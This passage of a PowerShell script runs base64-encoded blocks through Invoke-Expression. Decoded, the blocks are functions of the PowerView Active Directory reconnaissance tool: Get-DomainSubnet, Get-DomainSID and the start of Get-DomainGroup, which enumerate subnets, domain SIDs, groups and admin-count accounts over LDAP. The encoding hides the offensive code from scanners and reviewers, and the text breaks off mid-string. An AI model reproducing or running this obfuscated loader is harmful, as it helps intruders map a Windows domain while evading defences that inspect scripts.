CAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoLUpvaW4gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHskXy5Ub1N0cmluZygnWCcpLlBhZExlZnQoMiwnMCcpfSkpIC1SZXBsYWNlICcoLi4pJywnXCQxJwogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TdWJuZXRdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFN1Ym5ldFNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1zdWJuZXQpJEZpbHRlcikiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU3VibmV0XSBHZXQtRG9tYWluU3VibmV0IGZpbHRlciBzdHJpbmc6ICQoJFN1Ym5ldFNlYXJjaGVyLmZpbHRlcikiCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRTdWJuZXRTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkU3VibmV0U2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldCA9ICRfCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU3VibmV0ID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJFN1Ym5ldC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuU3VibmV0JykKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NpdGVOYW1lJ10pIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFN1Ym5ldC5wcm9wZXJ0aWVzIC1hbmQgKCRTdWJuZXQucHJvcGVydGllcy5zaXRlb2JqZWN0IC1saWtlICIqJFNpdGVOYW1lKiIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTdWJuZXQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkU3VibmV0LnNpdGVvYmplY3QgLWxpa2UgIiokU2l0ZU5hbWUqIikgewogICAgICAgICAgICAgICAgICAgICAgICAkU3VibmV0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblN1Ym5ldF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFN1Ym5ldFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNJRCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW1N0cmluZ10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAnTERBUEZpbHRlcicgPSAnKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKScKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICREQ1NJRCA9IEdldC1Eb21haW5Db21wdXRlciBAU2VhcmNoZXJBcmd1bWVudHMgLUZpbmRPbmUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKICAgIGlmICgkRENTSUQpIHsKICAgICAgICAkRENTSUQuU3ViU3RyaW5nKDAsICREQ1NJRC5MYXN0SW5kZXhPZignLScpKQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TSURdIEVycm9yIGV4dHJhY3RpbmcgZG9tYWluIFNJRCBmb3IgJyREb21haW4nIgogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdyb3VwIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Hcm91cCcpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQWxsb3dEZWxlZ2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1VzZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTWVtYmVySWRlbnRpdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQWRtaW5Db3VudCwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RvbWFpbkxvY2FsJywgJ05vdERvbWFpbkxvY2FsJywgJ0dsb2JhbCcsICdOb3RHbG9iYWwnLCAnVW5pdmVyc2FsJywgJ05vdFVuaXZlcnNhbCcpXQogICAgICAgIFtBbGlhcygnU2NvcGUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cFNjb3BlLAogICAgICAgIFtWYWxpZGF0ZVNldCgnU2VjdXJpdHknLCAnRGlzdHJpYnV0aW9uJywgJ0NyZWF0ZWRCeVN5c3RlbScsICdOb3RDcmVhdGVkQnlTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cFByb3BlcnR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXBTZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydNZW1iZXJJZGVudGl0eSddKSB7CiAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10pIHsKICAgICAgICAgICAgICAgICAgICAkT2xkUHJvcGVydGllcyA9ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVySWRlbnRpdHkKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkVHJ1ZQogICAgICAgICAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdERpcmVjdG9yeUVudHJ5ID0gJF8uR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICAgICAgICAgICRPYmplY3REaXJlY3RvcnlFbnRyeS5SZWZyZXNoQ2FjaGUoJ3Rva2VuR3JvdXBzJykKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RGlyZWN0b3J5RW50cnkuVG9rZW5Hcm91cHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNpZCA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRfLDApKS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwU2lkIC1ub3RtYXRjaCAnXlMtMS01LTMyLS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJEdyb3VwU2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1JhdyddID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9sZFByb3BlcnRpZXMpIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkT2xkUHJvcGVydGllcyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXAgPSBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR3JvdXAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15DTj0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXBTZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR3JvdXBdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLWltYXRjaCAnXlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCdcJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZS5SZXBsYWNlKCdcMjgnLCAnKCcpLlJlcGxhY2UoJ1wyOScsICcpJykgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBDYW5vbmljYWwKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBEb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cF0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FkbWluQ291bnQnXSkgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluR3JvdXBdIFNlYXJjaGluZyBmb3IgYWRtaW5Db3VudD0xJwogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyhhZG1pbmNvdW50PTEpJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snR3JvdXBTY29wZSddKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2NvcGVWYWx1ZSA9ICRQU0JvdW5kUGFyYW1ldGVyc1snR3JvdXBTY29wZSddCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciA9IFN3aXRjaCAoJEdyb3VwU2NvcGVWYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAnRG9tYWluTG9jYWwnICAgICAgIHsgJyhncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9NCknIH0KICAgICAgICAgICAgICAgICAgICAgICAgJ05vdERvbWFpbkxvY2FsJyAgICB7ICcoIShncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9NCkpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICdHbG9iYWwnICAgICAgICAgICAgeyAnKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKScgfQogICAgICAgICAgICAgICAgICAgICAgICAnTm90R2xvYmFsJyAgICAgICAgIHsgJyghKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSknIH0KICAgICAgICAgICAgICAgICAgICAgICAgJ1VuaXZlcnNhbCcgICAgICAgICB7ICcoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICdOb3RVbml2ZXJzYWwnICAgICAgeyAnKCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgpKScgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwXSBTZWFyY2hpbmcgZm9yIGdyb3VwIHNjb3BlICckR3JvdXBTY29wZVZhbHVlJyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0dyb3VwUHJvcGVydHknXSkgewogICAgICAgICAgICAgICAgICAgICRHcm91cFByb3BlcnR5VmFsdWUgPSAkUFNCb3VuZFBhcmFtZXRlcnNbJ0dyb3VwUHJvcGVydHknXQogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgPSBTd2l0Y2ggKCRHcm91cFByb3BlcnR5VmFsdWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1NlY3VyaXR5JyAgICAgICAgICAgICAgeyAnKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KScgfQogICAgICAgICAgICAgICAgICAgICAgICAnRGlzdHJpYnV0aW9uJyAgICAgICAgICB7ICcoIShncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MjE0NzQ4MzY0OCkpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICdDcmVhdGVkQnlTeXN0ZW0nICAgICAgIHsgJyhncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MSknIH0KICAgICAgICAgICAgICAgICAgICAgICAgJ05vdENyZWF0ZWRCeVN5c3RlbScgICAgeyAnKCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEpKScgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwXSBTZWFyY2hpbmcgZm9yIGdyb3VwIHB